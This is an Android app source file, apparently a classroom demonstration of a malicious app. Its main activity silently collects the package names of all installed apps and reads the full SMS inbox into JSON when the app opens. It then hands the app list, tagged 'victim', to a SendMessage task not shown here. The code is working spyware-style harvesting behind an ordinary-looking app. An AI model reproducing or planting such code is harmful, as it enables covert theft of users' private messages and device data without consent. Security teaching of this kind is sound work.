package edu.tufts.cs.mchow.dancingpig;

import android.app.Activity;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // List all apps installed
        // Source: http://stackoverflow.com/questions/2695746/how-to-get-a-list-of-installed-android-applications-and-pick-one-to-run
        final PackageManager pm = getPackageManager();

        // Get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        JSONArray apps = new JSONArray();
        for (ApplicationInfo packageInfo : packages) {
            JSONObject app = new JSONObject();
            try {
                app.put("app_name", packageInfo.packageName);
            }
            catch (JSONException je) {}
            catch (Exception e) {}
            apps.put(app);
        }

        // Read SMS messages
        // See http://stackoverflow.com/questions/848728/how-can-i-read-sms-messages-from-the-inbox-programmatically-in-android
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        cursor.moveToFirst();

        JSONArray messages = new JSONArray();
        do {
            JSONObject sms = new JSONObject();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                try {
                    sms.put(cursor.getColumnName(i),cursor.getString(i));
                }
                catch (JSONException je) {}
                catch (Exception e) {}
            }
            messages.put(sms);
        }
        while(cursor.moveToNext());

        new SendMessage().execute("victim", apps.toString());
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        if (id == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
